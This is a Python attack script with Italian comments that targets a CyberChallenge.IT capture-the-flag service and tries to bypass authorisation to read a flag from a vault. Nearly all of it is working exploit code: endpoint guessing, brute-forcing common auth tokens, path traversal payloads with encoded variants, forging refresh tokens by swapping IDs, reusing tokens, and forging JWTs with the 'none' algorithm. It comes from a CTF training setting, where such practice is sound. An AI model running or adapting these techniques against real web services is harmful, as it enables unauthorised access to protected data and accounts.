import requests
import json
import time
import sys

# Informazioni target
hostname = "faas.challs.cyberchallenge.it"
app_id = "74be5421-b524-4b06-8ada-6c111324454b"
vault_id = "bdc3e1e0-fa24-48fe-9f96-3c5390dbd842"
flag_key = "flag"

base_url = f"http://{hostname}/api"

def print_banner():
    print("""
╔═══════════════════════════════════════════════════╗
║                                                   ║
║    FaaS Auth Bypass - CyberChallenge.IT           ║
║                                                   ║
╚═══════════════════════════════════════════════════╝
    """)
    print(f"Target: {hostname}")
    print(f"App ID: {app_id}")
    print(f"Vault ID: {vault_id}")
    print(f"Flag Key: {flag_key}")
    print("=" * 50)

def check_direct_access():
    """
    Prova accesso diretto alla flag nel vault
    """
    print("\n[*] Test accesso diretto al vault...")
    url = f"{base_url}/get/{vault_id}/{flag_key}"
    try:
        resp = requests.get(url)
        print(f"[*] Risposta: {resp.status_code} - {resp.text}")
        
        if resp.status_code == 200:
            return True
    except Exception as e:
        print(f"[-] Errore: {str(e)}")
    
    return False

def test_vault_without_auth():
    """
    Tenta diverse varianti di accesso al vault senza autenticazione
    """
    print("\n[*] Test varianti di accesso al vault senza auth...")
    urls = [
        f"{base_url}/get/{vault_id}/{flag_key}",
        f"{base_url}/use/{vault_id}/{flag_key}",
        f"{base_url}/vault/{vault_id}/{flag_key}",
        f"{base_url}/vault/get/{vault_id}/{flag_key}",
        f"{base_url}/direct/{vault_id}/{flag_key}",
        f"{base_url}/raw/{vault_id}/{flag_key}",
        f"{base_url}/access/{vault_id}/{flag_key}",
        f"{base_url}/open/{vault_id}/{flag_key}",
        f"{base_url}/get?vault={vault_id}&key={flag_key}",
        f"{base_url}/get?id={vault_id}&key={flag_key}",
    ]
    
    for url in urls:
        try:
            print(f"[*] Provo: {url}")
            resp = requests.get(url)
            print(f"[*] Risposta: {resp.status_code} - {resp.text}")
            
            if resp.status_code == 200 and "flag" in resp.text.lower():
                print("[+] TROVATO ACCESSO AL VAULT!")
                return True
        except Exception as e:
            print(f"[-] Errore: {str(e)}")
    
    return False

def test_common_auth_tokens():
    """
    Prova token di autenticazione comuni
    """
    print("\n[*] Test auth token comuni...")
    
    common_tokens = [
        "admin", "root", "guest", "test", "debug", "default", 
        app_id, vault_id, "system", "superuser", "administrator",
        "1234", "123456", "password", "letmein", "trusted", "master"
    ]
    
    for token in common_tokens:
        try:
            url = f"{base_url}/get/{vault_id}/{flag_key}"
            headers = {"Auth": token}
            print(f"[*] Provo Auth: {token}")
            resp = requests.get(url, headers=headers)
            print(f"[*] Risposta: {resp.status_code} - {resp.text}")
            
            if resp.status_code == 200 and "flag" in resp.text.lower():
                print("[+] TROVATO TOKEN AUTH VALIDO!")
                return True
        except Exception as e:
            print(f"[-] Errore: {str(e)}")
    
    return False

def test_vault_as_app():
    """
    Prova a utilizzare il vault come se fosse un'app
    """
    print("\n[*] Test uso del vault come app...")
    
    try:
        # Richiedi autorizzazione usando il vault ID
        url = f"{base_url}/authorize/{vault_id}"
        print(f"[*] Richiedo autorizzazione per vault: {url}")
        resp = requests.get(url)
        print(f"[*] Risposta: {resp.status_code} - {resp.text}")
        
        if resp.status_code == 200:
            try:
                data = resp.json()
                if "token" in data:
                    wait_token = data.get("token")
                    print(f"[+] Ottenuto wait token per vault: {wait_token}")
                    
                    # Questo è interessante: il server accetta richieste di autorizzazione per il vault
                    # Attendi un po' e verifica se l'autorizzazione è stata concessa
                    print("[*] Verifica se l'autorizzazione è stata concessa...")
                    for i in range(3):
                        check_url = f"{base_url}/get_refresh/{wait_token}"
                        check_resp = requests.get(check_url)
                        print(f"[*] Verifica auth #{i+1}: {check_resp.status_code} - {check_resp.text}")
                        
                        if "accepted" in check_resp.text:
                            refresh_token = check_resp.json().get("token")
                            print(f"[+] Autorizzazione accettata! Refresh token: {refresh_token}")
                            
                            # Prova a ottenere un auth token
                            token_url = f"{base_url}/refresh/{refresh_token}"
                            token_resp = requests.get(token_url)
                            print(f"[*] Richiesta auth token: {token_resp.status_code} - {token_resp.text}")
                            
                            if token_resp.status_code == 200:
                                auth_token = token_resp.json().get("token")
                                print(f"[+] Ottenuto auth token: {auth_token}")
                                
                                # Prova ad accedere alla flag
                                flag_url = f"{base_url}/get/{vault_id}/{flag_key}"
                                headers = {"Auth": auth_token}
                                flag_resp = requests.get(flag_url, headers=headers)
                                print(f"[*] Accesso flag: {flag_resp.status_code} - {flag_resp.text}")
                                
                                if flag_resp.status_code == 200:
                                    print("[+] ACCESSO RIUSCITO ALLA FLAG!")
                                    return True
                        
                        time.sleep(1)
            except Exception as e:
                print(f"[-] Errore nel processo di autorizzazione: {str(e)}")
    except Exception as e:
        print(f"[-] Errore nell'autorizzazione: {str(e)}")
    
    return False

def test_directory_traversal():
    """
    Prova tecniche di directory traversal
    """
    print("\n[*] Test directory traversal...")
    
    traversal_paths = [
        f"{base_url}/get/{app_id}/../{vault_id}/{flag_key}",
        f"{base_url}/get/{app_id}/..%2f{vault_id}/{flag_key}",
        f"{base_url}/get/{app_id}%2f..%2f{vault_id}/{flag_key}",
        f"{base_url}/get/{app_id}/../../{vault_id}/{flag_key}",
        f"{base_url}/get/{app_id}/%2e%2e/{vault_id}/{flag_key}",
        f"{base_url}/get/{app_id}%2f%2e%2e%2f{vault_id}/{flag_key}",
        f"{base_url}/get/..%2f{vault_id}/{flag_key}",
        f"{base_url}/get/../{vault_id}/{flag_key}",
        f"{base_url}/get/{app_id}/.././{vault_id}/{flag_key}",
        f"{base_url}/get/{app_id}/..../{vault_id}/{flag_key}"
    ]
    
    for path in traversal_paths:
        try:
            print(f"[*] Provo: {path}")
            resp = requests.get(path)
            print(f"[*] Risposta: {resp.status_code} - {resp.text}")
            
            if resp.status_code == 200 and "flag" in resp.text.lower():
                print("[+] TROVATO PATH TRAVERSAL!")
                return True
        except Exception as e:
            print(f"[-] Errore: {str(e)}")
    
    return False

def test_request_app_then_vault():
    """
    Prova a ottenere un token per l'app e usarlo per il vault
    """
    print("\n[*] Test token app -> accesso vault...")
    
    try:
        # Richiedi autorizzazione per l'app
        url = f"{base_url}/authorize/{app_id}"
        print(f"[*] Richiedo autorizzazione per app: {url}")
        resp = requests.get(url)
        print(f"[*] Risposta: {resp.status_code} - {resp.text}")
        
        if resp.status_code == 200:
            try:
                data = resp.json()
                if "token" in data:
                    wait_token = data.get("token")
                    print(f"[+] Ottenuto wait token per app: {wait_token}")
                    
                    # Verifica se l'autorizzazione è stata concessa
                    print("[*] Verifica se l'autorizzazione è stata concessa (prova per 5 secondi)...")
                    for i in range(5):
                        check_url = f"{base_url}/get_refresh/{wait_token}"
                        check_resp = requests.get(check_url)
                        print(f"[*] Verifica auth #{i+1}: {check_resp.status_code} - {check_resp.text}")
                        
                        if "accepted" in check_resp.text:
                            refresh_token = check_resp.json().get("token")
                            print(f"[+] Autorizzazione accettata! Refresh token: {refresh_token}")
                            
                            # Prova a ottenere un auth token
                            token_url = f"{base_url}/refresh/{refresh_token}"
                            token_resp = requests.get(token_url)
                            print(f"[*] Richiesta auth token: {token_resp.status_code} - {token_resp.text}")
                            
                            if token_resp.status_code == 200:
                                auth_token = token_resp.json().get("token")
                                print(f"[+] Ottenuto auth token: {auth_token}")
                                
                                # Prova ad accedere alla flag nel vault
                                flag_url = f"{base_url}/get/{vault_id}/{flag_key}"
                                headers = {"Auth": auth_token}
                                flag_resp = requests.get(flag_url, headers=headers)
                                print(f"[*] Accesso flag nel vault: {flag_resp.status_code} - {flag_resp.text}")
                                
                                if flag_resp.status_code == 200:
                                    print("[+] ACCESSO RIUSCITO ALLA FLAG NEL VAULT!")
                                    return True
                                
                                # Prova anche a creare un token falsificato sostituendo l'app_id con il vault_id
                                if refresh_token and app_id in refresh_token and vault_id not in refresh_token:
                                    fake_token = refresh_token.replace(app_id, vault_id)
                                    print(f"[*] Creato token falsificato: {fake_token}")
                                    
                                    # Prova a ottenere un auth token con il token falsificato
                                    fake_url = f"{base_url}/refresh/{fake_token}"
                                    fake_resp = requests.get(fake_url)
                                    print(f"[*] Richiesta auth token falsificato: {fake_resp.status_code} - {fake_resp.text}")
                                    
                                    if fake_resp.status_code == 200:
                                        fake_auth = fake_resp.json().get("token")
                                        print(f"[+] Ottenuto auth token falsificato: {fake_auth}")
                                        
                                        # Prova ad accedere alla flag
                                        headers = {"Auth": fake_auth}
                                        flag_resp = requests.get(flag_url, headers=headers)
                                        print(f"[*] Accesso flag con token falsificato: {flag_resp.status_code} - {flag_resp.text}")
                                        
                                        if flag_resp.status_code == 200:
                                            print("[+] ACCESSO RIUSCITO ALLA FLAG CON TOKEN FALSIFICATO!")
                                            return True
                            break
                        
                        time.sleep(1)
                
                # Se nessun test ha avuto successo, proviamo a vedere se il refresh token può essere riutilizzato
                if refresh_token:
                    print("\n[*] Provo a riutilizzare il refresh token più volte...")
                    for _ in range(3):
                        token_url = f"{base_url}/refresh/{refresh_token}"
                        token_resp = requests.get(token_url)
                        print(f"[*] Riutilizzo refresh token: {token_resp.status_code} - {token_resp.text}")
                        
                        if token_resp.status_code == 200:
                            auth_token = token_resp.json().get("token")
                            print(f"[+] Ottenuto nuovo auth token: {auth_token}")
                            
                            # Prova ad accedere alla flag nel vault con ogni token
                            flag_url = f"{base_url}/get/{vault_id}/{flag_key}"
                            headers = {"Auth": auth_token}
                            flag_resp = requests.get(flag_url, headers=headers)
                            print(f"[*] Accesso flag nel vault: {flag_resp.status_code} - {flag_resp.text}")
                            
                            if flag_resp.status_code == 200:
                                print("[+] ACCESSO RIUSCITO ALLA FLAG NEL VAULT CON TOKEN RIUTILIZZATO!")
                                return True
                        
                        time.sleep(0.5)
            except Exception as e:
                print(f"[-] Errore nel processo di autorizzazione: {str(e)}")
    except Exception as e:
        print(f"[-] Errore nell'autorizzazione: {str(e)}")
    
    return False

def test_tampering_ids():
    """
    Prova a manipolare gli ID e vedere se è possibile accedere al vault
    """
    print("\n[*] Test manipolazione ID...")
    
    # Crea varianti dell'ID
    test_ids = [
        vault_id.upper(),
        vault_id.lower(),
        vault_id.replace('-', ''),
        vault_id.replace('-', '_'),
        app_id + "/" + vault_id,
        app_id + ":" + vault_id,
        app_id + "&id=" + vault_id,
        vault_id + "?key=" + flag_key
    ]
    
    for test_id in test_ids:
        try:
            url = f"{base_url}/get/{test_id}/{flag_key}"
            print(f"[*] Provo ID: {test_id}")
            resp = requests.get(url)
            print(f"[*] Risposta: {resp.status_code} - {resp.text}")
            
            if resp.status_code == 200 and "flag" in resp.text.lower():
                print("[+] TROVATO ID MANIPOLATO VALIDO!")
                return True
        except Exception as e:
            print(f"[-] Errore: {str(e)}")
    
    return False

def test_jwt_none_alg():
    """
    Verifica se i token sono JWT e prova l'attacco None algorithm
    """
    print("\n[*] Test JWT None algorithm...")
    
    # Ottieni un token
    url = f"{base_url}/authorize/{app_id}"
    resp = requests.get(url)
    
    if resp.status_code == 200:
        data = resp.json()
        token = data.get("token")
        
        # Verifica se il token è un JWT (contiene due punti)
        if token and token.count('.') == 2:
            print(f"[+] Trovato possibile JWT: {token}")
            
            # Prova l'attacco None algorithm
            header, payload, signature = token.split('.')
            
            import base64
            import json
            
            # Decodifica header
            padded_header = header + '=' * (4 - len(header) % 4)
            try:
                decoded_header = base64.urlsafe_b64decode(padded_header).decode('utf-8')
                header_json = json.loads(decoded_header)
                print(f"[*] Header decodificato: {header_json}")
                
                # Modifica l'algoritmo a 'none'
                header_json['alg'] = 'none'
                
                # Ricodifica
                new_header = base64.urlsafe_b64encode(json.dumps(header_json).encode()).decode('utf-8').rstrip('=')
                
                # Crea il nuovo token senza firma
                none_token = f"{new_header}.{payload}."
                print(f"[*] Token con algoritmo 'none': {none_token}")
                
                # Prova a usare il token
                headers = {"Auth": none_token}
                test_url = f"{base_url}/get/{vault_id}/{flag_key}"
                test_resp = requests.get(test_url, headers=headers)
                print(f"[*] Test JWT none: {test_resp.status_code} - {test_resp.text}")
                
                if test_resp.status_code == 200 and "flag" in test_resp.text.lower():
                    print("[+] ATTACCO JWT NONE RIUSCITO!")
                    return True
            except Exception as e:
                print(f"[-] Errore nella manipolazione JWT: {str(e)}")
    
    return False

def main():
    print_banner()
    
    print("\n[*] Inizio tentativi di bypass autorizzazione...")
    
    # 1. Prova accesso diretto
    if check_direct_access():
        print("[+] Accesso diretto riuscito!")
        return
    
    # 2. Prova varianti di accesso senza autenticazione
    if test_vault_without_auth():
        print("[+] Accesso senza autenticazione riuscito!")
        return
    
    # 3. Prova token comuni
    if test_common_auth_tokens():
        print("[+] Accesso con token comune riuscito!")
        return
    
    # 4. Prova ad usare il vault come app
    if test_vault_as_app():
        print("[+] Accesso usando il vault come app riuscito!")
        return
    
    # 5. Prova directory traversal
    if test_directory_traversal():
        print("[+] Accesso con directory traversal riuscito!")
        return
    
    # 6. Prova a richiedere token per app e poi accedere al vault
    if test_request_app_then_vault():
        print("[+] Accesso al vault con token app riuscito!")
        return
    
    # 7. Prova a manipolare gli ID
    if test_tampering_ids():
        print("[+] Accesso con ID manipolato riuscito!")
        return
    
    # 8. Prova attacco JWT None algorithm
    if test_jwt_none_alg():
        print("[+] Attacco JWT None riuscito!")
        return
    
    print("\n[-] Tutti i tentativi di bypass sono falliti. Prova ad ottenere l'autorizzazione manuale.")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Programma interrotto dall'utente")
    except Exception as e:
        print(f"\n[!] Errore non gestito: {str(e)}")
        import traceback
        traceback.print_exc() 